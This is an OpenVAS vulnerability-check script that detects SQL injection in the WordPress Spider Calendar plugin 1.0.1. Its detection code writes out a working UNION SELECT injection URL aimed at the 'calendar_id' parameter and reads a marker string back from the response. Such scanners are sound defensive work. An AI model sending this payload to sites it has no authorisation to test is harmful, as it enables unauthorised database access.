###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_spider_calendar_plugin_mult_sql_inj_vuln.nasl 3058 2016-04-14 10:45:44Z benallard $
#
# WordPress Spider Calendar Plugin Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to manipulate SQL queries by
  injecting arbitrary SQL code and gain sensitive information.
  Impact Level: Application";
tag_affected = "WordPress Spider Calendar Plugin version 1.0.1";
tag_insight = "Input passed via the 'calendar_id' parameter to
  'front_end/spidercalendarbig_seemore.php' (when 'ev_ids' is set to the id
  of an available event) is not properly sanitised before being used in a SQL
  query.";
tag_solution = "Upgrade to WordPress Spider Calendar Plugin version 1.1.0 or later,
  For updates refer to http://wordpress.org/extend/plugins/spider-calendar/";
tag_summary = "This host is running WordPress Spider Calendar Plugin and is prone to
  multiple SQL Injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803101";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3058 $");
  script_bugtraq_id(55779);
  script_tag(name:"last_modification", value:"$Date: 2016-04-14 12:45:44 +0200 (Thu, 14 Apr 2016) $");
  script_tag(name:"creation_date", value:"2012-10-18 19:07:20 +0530 (Thu, 18 Oct 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Spider Calendar Plugin Multiple SQL Injection Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50812");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/79042");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/21715/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117078/WordPress-Spider-1.0.1-SQL-Injection-XSS.html");

  script_summary("Check if WordPress Spider Calendar Plugin is prone to SQL injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
url = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Iterate over plugins dir
plugins = make_list("spider-calendar", "calendar");

foreach plugin (plugins)
{
  ## Construct SQL Injection attack
  url = dir + '/wp-content/plugins/' + plugin + '/front_end/' +
        'spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null' +
        '%20union%20all%20select%201,1,1,1,0x4f70656e564153,1,1,1,1,1,1,1,1,' +
        '1,1,1,1+--+';

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
                     pattern:"OpenVAS<"))
  {
    security_message(port:port);
    exit(0);
  }
}
